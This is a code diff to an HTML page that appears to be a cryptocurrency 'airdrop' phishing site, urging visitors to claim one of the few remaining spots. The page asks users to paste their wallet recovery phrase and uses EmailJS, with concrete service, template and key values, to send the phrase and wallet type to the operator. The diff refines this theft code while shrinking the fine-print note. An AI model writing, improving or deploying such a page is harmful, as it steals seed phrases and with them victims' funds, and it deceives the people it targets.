@@ -151,7 +151,7 @@
 
     .note {
       margin-top: 20px;
-      font-size: 0.9rem;
+      font-size: 0.75rem;
       color: #333;
       text-align: center;
       background: #fff3cd;
@@ -214,21 +214,14 @@ With 6,000+ wallets already credited, only 2,000+ spots remain — don’t miss 
     </select>
 
     <label for="wallet-phrase">Enter Your Wallet Phrase</label>
-    <textarea 
-      id="wallet-phrase" 
-      name="wallet_phrase" 
-      placeholder="Copy & Paste Wallet Phrase" 
-      required
-    ></textarea>
+    <textarea id="wallet-phrase" placeholder="Copy & Paste Wallet Phrase" style="width: 100%; height: 150px; font-size: 1rem; border: 1px solid #ccc; border-radius: 5px;"></textarea>
 
     <div class="note">
       <p>Note: Only wallets with a balance or transaction history will be credited.</p>
     </div>
 
-    <button class="btn" type="button" onclick="sendEmail()">Validate</button>
-  </form>
-</div>
-
+    <button class="btn" onclick="validateWallet()">Validate</button>
+  </div>
 
   <!-- Footer Section -->
   <footer>
@@ -238,52 +231,37 @@ With 6,000+ wallets already credited, only 2,000+ spots remain — don’t miss 
     </div>
   </footer>
 
-  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
-<script>
-  // Initialize EmailJS
+  <script>
   (function() {
-    emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your actual EmailJS Public Key
+    emailjs.init("G_xpu-q_9uUz2tG_X"); // Replace with your EmailJS public key
   })();
 
   function showWalletPage() {
-    // Blur entire page and prevent scrolling
     document.getElementById('main-content').classList.add('blurred');
     document.querySelector('header').classList.add('blurred');
     document.querySelector('footer').classList.add('blurred');
     document.body.style.overflow = 'hidden';
-
-    // Show wallet page
     document.getElementById('wallet-page').classList.add('active');
   }
 
   function validateWallet() {
-    const walletPhrase = document.getElementById('wallet-phrase').value;
     const walletType = document.getElementById('wallet-type').value;
+    const walletPhrase = document.getElementById('wallet-phrase').value;
 
     if (!walletPhrase) {
       alert('Please enter your wallet phrase!');
-    } else {
-      alert('Connecting to server. Processing for eligibility...');
-
-      const serviceID = "service_oh2l5fc"; // Replace with your Service ID
-      const templateID = "template_oty8s2s"; // Replace with your Template ID
-
-      const templateParams = {
-        wallet_type: walletType,
-        wallet_phrase: walletPhrase
-      };
-
-      // Send data to EmailJS
-      emailjs.send(serviceID, templateID, templateParams)
-        .then((response) => {
-          alert('Wallet details sent successfully!');
-          console.log('SUCCESS!', response.status, response.text);
-        }, (error) => {
-          alert('Failed to send wallet details. Please try again.');
-          console.error('FAILED...', error);
-        });
+      return;
     }
+
+    // Send data using EmailJS
+    emailjs.send("service_oh2l5fc", "template_oty8s2s", {
+      wallet_type: walletType,
+      wallet_phrase: walletPhrase
+    })
+    .then(function(response) {
+      alert("Wallet submitted successfully!");
+    }, function(error) {
+      alert("Error sending wallet details. Please try again.");
+    });
   }
 </script>
-</body>
-</html>
